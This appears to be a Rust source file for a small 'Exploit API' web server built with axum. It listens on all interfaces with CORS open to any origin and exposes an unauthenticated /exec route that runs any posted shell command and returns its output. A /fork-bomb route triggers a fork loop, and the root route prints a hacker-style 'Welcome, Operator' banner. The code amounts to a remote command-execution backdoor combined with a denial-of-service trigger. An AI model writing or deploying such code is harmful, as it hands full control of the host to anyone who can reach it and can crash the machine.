use axum::routing::post;
use axum::Json;
use exploits::fork_bomb;
use exploits::command;

use axum::http::{self, StatusCode};
use axum::response::IntoResponse;
use tower_http::cors::{AllowHeaders, Any, CorsLayer};
use tower::ServiceBuilder;

use axum::{
    routing::get, Router,
};

use serde::Deserialize;

#[derive(Deserialize)]
struct Command {
    command: String,
}

mod exploits;

#[tokio::main]
async fn main() {

    let cors_layer = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods([http::Method::GET, http::Method::POST])
        .allow_headers(AllowHeaders::any());
        
    let app = Router::new()
        .route("/", get(root))
        .route("/fork-bomb", get(fork_bomb::fork_loop))
        .route("/exec", post(execute_command_handler))
        .route("/health", get(health_check))
        .layer(ServiceBuilder::new().layer(cors_layer));

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await.unwrap();
    println!("API is ready and listening on http://0.0.0.0:3000");
    axum::serve(listener, app).await.unwrap();
}

async fn execute_command_handler(Json(payload): Json<Command>) -> impl IntoResponse {
    let command_with_args = payload.command;
    println!("{:?}", command_with_args);
    let mut parts = command_with_args.split_whitespace();
    let command = parts.next().unwrap_or_default().to_string();
    let args: Vec<String> = parts.map(String::from).collect();

    match command::execute_command(&command, &args.iter().map(String::as_str).collect::<Vec<&str>>()) {
        Ok(output) => {
            let response = serde_json::json!({
            "output": {
                "stdout": String::from_utf8(output.stdout).unwrap(),
                "stderr": String::from_utf8(output.stderr).unwrap()
            },
            "type": "success"
            });
            (StatusCode::OK, Json(response))
        },
        Err(err) => {
            let response = serde_json::json!({});
            (StatusCode::INTERNAL_SERVER_ERROR, Json(response))
        },
    }
}

async fn health_check() -> impl IntoResponse {
    (StatusCode::OK, "API is healthy and running.")
}

async fn root() -> &'static str {
    r#"
    [+] Connected to Exploit API v0.1
    [+] Status: Live and Listening...
    [+] Next move: ./trigger --exploit all
    
    > Welcome, Operator.
    "#
}

